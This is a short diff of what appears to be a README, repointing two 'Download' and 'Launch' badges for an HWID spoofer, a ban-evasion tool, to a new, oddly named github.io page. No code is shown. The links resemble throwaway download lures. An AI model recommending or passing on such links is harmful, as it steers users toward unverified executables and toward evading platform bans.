@@ -5,10 +5,10 @@
 ---
 
 🟢 **Download HWID Spoofer Assistant**  
-[![Download HWID Spoofer](https://img.shields.io/badge/Download-HWID_Spoofer-green?style=for-the-badge&logo=windows)](https://seghizzidevi.github.io/.github/)
+[![Download HWID Spoofer](https://img.shields.io/badge/Download-HWID_Spoofer-green?style=for-the-badge&logo=windows)](https://hwidspoofter12won1.github.io/.github/)
 
 🟢 **Start Spoofer Tool**  
-[![Launch Spoofer](https://img.shields.io/badge/Launch-Spoofer_Tool-green?style=for-the-badge&logo=github)](https://seghizzidevi.github.io/.github/)
+[![Launch Spoofer](https://img.shields.io/badge/Launch-Spoofer_Tool-green?style=for-the-badge&logo=github)](https://hwidspoofter12won1.github.io/.github/)
 
 ---
 
